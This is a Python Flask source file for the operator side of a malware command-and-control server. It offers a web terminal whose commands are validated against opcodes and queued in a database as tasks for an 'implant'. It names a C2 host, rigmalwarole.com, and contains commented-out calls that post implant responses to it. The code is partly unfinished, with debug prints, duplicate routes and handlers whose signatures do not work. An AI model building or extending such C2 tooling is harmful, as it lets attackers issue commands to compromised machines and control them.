from flask import Blueprint, session, render_template, redirect, url_for
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired, Length
from  database import db
from models import *
import secrets
from client_pb2 import *
from urllib.parse import urljoin
from client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
from constants import opcodes
import requests 

client = Blueprint('client', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/client//task/list"
task_create = "/client/task/create"
register = "/client/register"
request = "/client/request"
response = "/client/response"
packet = "/client/packet"


class Terminal(FlaskForm):
    cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])

@client.route('/client', methods=['GET', 'POST'])
def index():
    form = Terminal()
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    whole = None
    error_message = None  # Initialize the error message to None
    if form.validate_on_submit():
        whole = form.cmd.data
        parts = whole.split(' ', 1)
        leftoverstring = ''
        try:
            firstword, leftoverstring = parts
        except: 
            firstword = parts[0]
        if valid_command(firstword):
            msg = Command()
            msg.cmd = firstword
            msg.args = leftoverstring
            print('Slay Baddies your command was received successfully!')
            test = handle_t_request(1, msg.cmd, msg.args)
            print(test)
        else:
            error_message = 'Invalid Command Loser :('  # Set the error message
    return render_template('index.html', form=form, cmd=whole, error_message=error_message)

def valid_command(cmd):
    if cmd not in opcodes:
        return False
    return True

def analyze_input(cmd, args):
    pass


#@client.route('/client/request', methods=["POST"])
def handle_t_request(implant_id, cmd, args):
    print(f'REQUEST FROM CLIENT')
    r = ClientTaskRequest()
    r.ImplantID = implant_id
    r.JobID = 1  # static for testing
    r.Function = cmd
    r.Inputs = args
    out = r.SerializeToString()
    print("here")
    new_task = make_task(
            id=None,
            task_id=generate_task_id(),
            status="created",
            implant_guid=r.ImplantID,
            task_opcode=1,
            task_args=r.Inputs
        )
    print("before")
    db.session.add(new_task)
    print("middle")
    db.session.commit()
    print("HEYYYY")
    return "True"


@client.route(response, methods=["POST"])
def handle_t_response(implant_id, jobID, output):
    print(f'RESPONSE FROM CLIENT')
    r = ClientTaskResponse()
    r.ImplantID = implant_id
    r.JobID = jobID
    r.Output = output
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, response), data = out)

@client.route(response, methods=["POST"])
def handle_packet(msg, csrf):
    print(f'PACKET FROM CLIENT')
    r = Packet()
    r.Message = msg
    r.CSRF = csrf
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, csrf), data = out)
